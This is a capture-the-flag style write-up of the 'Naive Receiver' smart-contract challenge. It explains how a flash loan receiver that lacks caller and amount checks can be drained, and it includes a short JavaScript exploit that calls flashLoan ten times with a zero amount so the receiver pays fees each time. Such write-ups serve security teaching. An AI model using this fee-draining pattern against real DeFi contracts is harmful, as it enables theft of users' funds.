# Naive Receiver

## Problem

A flash loan receiver does not perform sanity checks on the `receiveEther` routine. Ideally it should check that this routine is only called by the owner of the contract and that the loan amount is at least equal to the fee amount or not 0 so as not to waste fees.

## Exploit

```js
// naive-receiver.challenge.js
...
this.pool.connect(attacker);
for (let i = 0; i < 10; i++){
    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
}
...
```

## Explanation

```
Objective:
1. Drain the FlashLoanReceiver.sol contract
  a. If pool address can be changed
    a.1 pool address can only be chained if the contract is redeployed
  b. pay the fees 10 times
    b.1 no validation on the loan amount and caller of the flashLoan
  c. change the loan amount
    c.1 validation checks on the pool routine make this not possible since only the pool can call the receiveEther function
```